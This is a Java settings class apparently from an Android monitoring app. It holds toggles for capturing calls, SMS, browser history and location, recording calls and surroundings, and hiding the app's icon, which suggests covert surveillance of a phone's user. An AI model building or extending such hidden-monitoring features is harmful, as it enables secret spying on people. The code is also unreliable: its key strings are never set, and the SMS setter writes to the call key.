package com.shadiz.usergin.shadowview.utils;

import android.content.Context;
import android.content.SharedPreferences;

import com.google.gson.Gson;
import com.shadiz.usergin.shadowview.model.DeviceInfo;

import javax.inject.Inject;

/**
 * Created by oldman on 26.10.16.
 */

public class Preferences {
    public static final String PREFS_NAME = "MyPrefsFile";
    private final SharedPreferences prefs;
    private static final String visited = "is_visited";
    //-------------for begining request---------------------
    private static final String baseDeviceInfo = "base_device_info";
    private static final String hideIcon = "is_hide_icon";
    private static final String isAllDeviceInfo = "is_all_device_info";
    private static Gson gson;
    private static final String account = "account";
    //------------variable settings-----------------------
    private static String call;
    private static String sms;
    private static String historyBrouser;
    private static String location;
    private static String modeLocation;
    private static String dispatch;
    private static String image;
    private static String audio;
    private static String recordCall;
    private static String recordEnvironment;
    private static String recordCallEnvironment;
    private static String listCall;
    private static String listSms;
    private static String listContact;
    private static String listApp;

    public String getCall() {
        return prefs.getString(call, "0");
    }

    public void setCall(String mCall) {
        prefs.edit().putString(call, mCall).apply();
    }

    public String getSms() {
        return prefs.getString(sms, "0");
    }

    public void setSms(String mSms) {
        prefs.edit().putString(call, mSms).apply();
    }

    public String getHistoryBrouser() {
        return prefs.getString(historyBrouser, "0");
    }

    public void setHistoryBrouser(String mHistoryBrouser) {
        prefs.edit().putString(historyBrouser, mHistoryBrouser).apply();
    }

    public String getLocation() {
        return prefs.getString(location, "0");
    }

    public void setLocation(String mLocation) {
        prefs.edit().putString(location, mLocation).apply();
    }

    public String getModeLocation() {
        return prefs.getString(modeLocation, "0");

    }

    public void setModeLocation(String mModeLocation) {
        prefs.edit().putString(modeLocation, mModeLocation).apply();
    }

    public String getDispatch() {
        return prefs.getString(dispatch, "0");
    }

    public void setDispatch(String mDispatch) {
        prefs.edit().putString(dispatch, mDispatch).apply();
    }

    public String getImage() {
        return prefs.getString(image, "0");
    }

    public void setImage(String mImage) {
        prefs.edit().putString(image, mImage).apply();
    }

    public String getAudio() {
        return prefs.getString(audio, "0");
    }

    public void setAudio(String mAudio) {
        prefs.edit().putString(audio, mAudio).apply();
    }

    public String getRecordCall() {
        return prefs.getString(recordCall, "0");
    }

    public void setRecordCall(String mRecordCall) {
        prefs.edit().putString(recordCall, mRecordCall).apply();
    }

    public String getRecordEnvironment() {
        return prefs.getString(recordEnvironment, "0");
    }

    public void setRecordEnvironment(String mRecordEnvironment) {
        prefs.edit().putString(recordEnvironment, mRecordEnvironment).apply();
    }

    public String getRecordCallEnvironment() {
        return prefs.getString(recordCallEnvironment, "0");
    }

    public void setRecordCallEnvironment(String mRecordCallEnvironment) {
        prefs.edit().putString(recordCallEnvironment, mRecordCallEnvironment).apply();
    }

    public String getListCall() {
        return prefs.getString(listCall, "0");
    }

    public void setListCall(String mListCall) {
        prefs.edit().putString(listCall, mListCall).apply();
    }

    public String getListSms() {
        return prefs.getString(listSms, "0");
    }

    public void setListSms(String mListSms) {
        prefs.edit().putString(listSms, mListSms).apply();
    }

    public String getListContact() {
        return prefs.getString(listContact, "0");
    }

    public void setListContact(String mListContact) {
        prefs.edit().putString(listContact, mListContact).apply();
    }

    public String getListApp() {
        return prefs.getString(listApp, "0");
    }

    public void setListApp(String mListApp) {
        prefs.edit().putString(listApp, mListApp).apply();
    }


    @Inject
    public Preferences(Context context) {
        prefs = context.getSharedPreferences(PREFS_NAME, 0);
        gson = new Gson();
    }

    public int getAccount() {
        return prefs.getInt(account, -1);
    }

    public void setAccount(int id) {
        prefs.edit().putInt(account, id).apply();
    }

    public boolean isVisited() {
        return prefs.getBoolean(visited, false);
    }

    public void setVisited() {
        prefs.edit().putBoolean(visited, true).apply();
    }

    public DeviceInfo getBaseDeviceInfo() {
        String dev = prefs.getString(baseDeviceInfo, null);
        return gson.fromJson(dev, DeviceInfo.class);
    }


    public void setBaseDeviceInfo(DeviceInfo dev) {
        String stringDev = gson.toJson(dev);
        prefs.edit().putString(baseDeviceInfo, stringDev).apply();
    }

    public boolean isHideIcon() {
        return prefs.getBoolean(hideIcon, false);
    }

    public void setHideIcon(boolean isHide) {
        prefs.edit().putBoolean(hideIcon, isHide).apply();
    }

    public boolean isAllDeviceInfo() {
        return prefs.getBoolean(isAllDeviceInfo, false);
    }

    public void setIsAllDeviceInfo(boolean isInfo) {
        prefs.edit().putBoolean(isAllDeviceInfo, isInfo).apply();
    }

    public void setFirstSettings() {
        SharedPreferences.Editor edit = prefs.edit();
        edit.putBoolean("hasVisited", true);
        edit.putBoolean("is_info", true);
        edit.putString("period", "1"); // period must equal 10 min
        edit.putString("code", "-1");
        edit.commit();
    }


}
